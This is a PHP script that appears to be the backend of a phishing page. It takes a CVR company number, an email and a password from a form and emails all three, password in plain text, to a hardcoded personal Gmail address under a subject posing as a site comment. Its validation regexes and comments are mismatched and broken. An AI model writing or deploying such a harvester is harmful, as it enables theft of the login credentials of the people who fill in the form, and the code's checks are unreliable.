<?php 
if (isset($_REQUEST['submitted'])) {
// Initialize error array.
  $errors = array();
  // Check for a proper First name
  if (!empty($_REQUEST['cvr'])) {
  $cvr = $_REQUEST['cvr'];
  $pattern = "/^[0-9]{1,8}/";// This is a regular expression that checks if the name is valid characters
  if (preg_match($pattern,$cvr)){ $cvr = $_REQUEST['cvr'];}
  else{ $errors[] = 'Your CVR can only contain _, 1-9 6-8 long.';}

  } else {$errors[] = 'You forgot to enter your CVR number.';}
  
  // Check for a proper Last name
  if (!empty($_REQUEST['email'])) {
  $email = $_REQUEST['email'];
  $pattern = "/^[a-zA-Z0-9\_]{1,20}/";// This is a regular expression that checks if the name is valid characters
  if (preg_match($pattern,$email)){ $email = $_REQUEST['email'];}
  else{ $errors[] = 'Your Name can only contain _, 1-9, A-Z or a-z 2-20 long.';}
  } else {$errors[] = 'You forgot to enter your email.';}
  
  //Check for a valid phone number
  if (!empty($_REQUEST['psw'])) {
  $psw = $_REQUEST['psw'];
  $pattern = "/^[a-zA-Z0-9\_]{1,20}/";
  if (preg_match($pattern,$psw)){ $psw = $_REQUEST['psw'];}
  else{ $errors[] = 'Your password can only contain _, 1-9, A-Z or a-z and be 2-20 long.';}
  } else {$errors[] = 'You forgot to enter your password.';}
  }

  //End of validation 

  if (isset($_REQUEST['submitted'])) {
  if (empty($errors)) { 
  $from = "From: Our Site!"; //Site name
  // Change this to your email address you want to form sent to
  $to = "turmz92@gmail.com"; 
  $subject = "Admin - Our Site! Comment from " . $cvr . "";
  
  $message = "Message from " . $cvr . " " . $email . " 
  Password: " . $psw . "" ;
  mail($to,$subject,$message,$from);
  }
}
?>